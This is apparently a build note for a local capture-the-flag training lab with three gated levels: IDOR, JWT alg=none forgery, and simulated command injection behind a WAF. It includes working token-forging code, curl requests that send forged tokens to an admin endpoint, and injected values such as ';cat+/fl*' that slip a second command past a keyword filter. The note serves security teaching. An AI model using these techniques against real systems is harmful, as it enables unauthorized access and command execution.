# Gated Ladder recipe for the Live Range (session 3, 2026-07-12)

The user asked: make the training lab NOT hard, increase difficulty BY LEVEL, and
unlock ONE-BY-ONE "like in the game". Implemented as a 3-level gated ladder inside the
existing synthetic Live Range (see `live_range_rebuild.md` for the base sandbox + proxy).

## Design
- LEVEL 1 - SLOW   : IDOR. `/api/orders?user=0`. Trivial param flip (user=1 -> user=0).
- LEVEL 2 - MEDIUM : JWT alg=none forgery. `GET /api/token` -> forge `alg=none`, `sub=admin`
                      (build header.payload. in-browser with btoa) -> `POST /api/admin`.
- LEVEL 3 - HARD   : Simulated CMDi behind a WAF. `/api/ping?host=8.8.8.8;cat+/fl*&waf=1`.
                      The WAF blocks the literal word "flag", forcing glob obfuscation
                      (`;cat+/fl*` or `/f??g`) -- `;cat+/flag` returns `{"blocked":true}`.

## Gating (client-side, training aid -- not a security boundary)
- A progress bar fills SLOW->MEDIUM->HARD (`solved.length/3*100%`).
- Levels 2 & 3 are `locked` (greyed, overlay "Solve Level N to unlock") until the prior flag
  is captured. Solved levels stored in `localStorage` key `lailaba_range` (array of ints).
- On solve: `mark(n,ok)` pushes n, saves, re-renders, auto-scrolls + shows "Level N+1 unlocked!".
- Hard-refresh keeps state (localStorage). Not enforced server-side on purpose (personal device).

## CRITICAL frontend rule (the bug that cost a round-trip)
Build every request RELATIVE to the iframe's base. Under the proxy the iframe lives at
`/api/lab/runtime/`, so an ABSOLUTE `fetch('/api/orders?user=0')` resolves to
`http://host:8000/api/orders` -> FastAPI 404 (`{"detail":"Not Found"}`). The page + status pill
still load because they hit `/api/lab/runtime/api/health`.

```js
const BASE = (location.pathname.endsWith('/') ? location.pathname
  : location.pathname.replace(/\/[^/]*$/, '/'));
const rel = v => BASE + ((v||'').trim().startsWith('/') ? v.slice(1) : v);
// then:  fetch(rel('api/orders?user=0'))   fetch(rel('api/admin'), {method:'POST', headers:{'Authorization':'Bearer '+tok}})
```

## In-browser JWT forge (Level 2) -- works offline, no external site
```js
function b64url(str){ return btoa(unescape(encodeURIComponent(str)))
  .replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
const header  = b64url(JSON.stringify({alg:'none',typ:'JWT'}));
const payload = b64url(JSON.stringify({sub:'admin',scope:'admin'}));
const forged  = header + '.' + payload + '.';   // alg=none -> no signature needed
```

## WAF handler (Level 3, server side -- already in labserve.py)
```python
def handle_ping(params):
    host = unquote_plus(params.get("host", ["8.8.8.8"])[0])
    waf = params.get("waf", ["0"])[0] == "1"
    if waf and "flag" in host.lower():
        return {"cmd": f"ping -c1 {host}",
                "output": "BLOCKED by WAF: the literal 'flag' is filtered. "
                          "Obfuscate the filename (wildcard/glob), e.g. ;cat+/fl*",
                "blocked": True}
    if re.search(r"[;&|`$]", host):
        return {"cmd": f"ping -c1 {host}",
                "output": f"PONG 8.8.8.8\ncat /flag => {FLAGS['cmdi']}"}
    return {"cmd": f"ping -c1 {host}", "output": f"PONG {host} (0% loss)"}
```

## Verify on device (proxy = same-origin path the browser uses)
```bash
curl -s "http://127.0.0.1:8000/api/lab/runtime/api/health"          # {"levels":3,...}
curl -s "http://127.0.0.1:8000/api/lab/runtime/api/orders?user=0"   # FLAG{idor...}
# JWT: forge header.payload. then POST:
curl -s -X POST "http://127.0.0.1:8000/api/lab/runtime/api/admin" \
  -H "Authorization: Bearer $(python3 -c 'import base64;h=base64.urlsafe_b64encode(b"{\"alg\":\"none\",\"typ\":\"JWT\"}").rstrip(b"=").decode();p=base64.urlsafe_b64encode(b"{\"sub\":\"admin\"}").rstrip(b"=").decode();print(h+"."+p+".")')"
# -> FLAG{jwt...}
curl -s "http://127.0.0.1:8000/api/lab/runtime/api/ping?host=8.8.8.8;cat+/flag&waf=1"  # {"blocked":true}
curl -s "http://127.0.0.1:8000/api/lab/runtime/api/ping?host=8.8.8.8;cat+/fl*&waf=1"   # FLAG{cmdi...}
# The served /lab/ page must contain LEVEL 1/2/3 + "Solve Level 1 to unlock" + forgeAndSend
curl -s http://127.0.0.1:8000/api/lab/runtime/ | grep -oE "LEVEL 1|LEVEL 2|LEVEL 3|forgeAndSend|Solve Level 1 to unlock"
```

## Restart after change
labserve.py is a standalone tmux process (NOT reloaded by uvicorn). After editing it:
`tmux kill-session -t lailaba-lab; tmux new-session -d -s lailaba-lab "python3 ~/lailaba-ai/lab/runtime/labserve.py"`.
The arena HTML/JS/CSS are static -- hard-refresh the browser (Ctrl/Cmd+Shift+R) to load them.
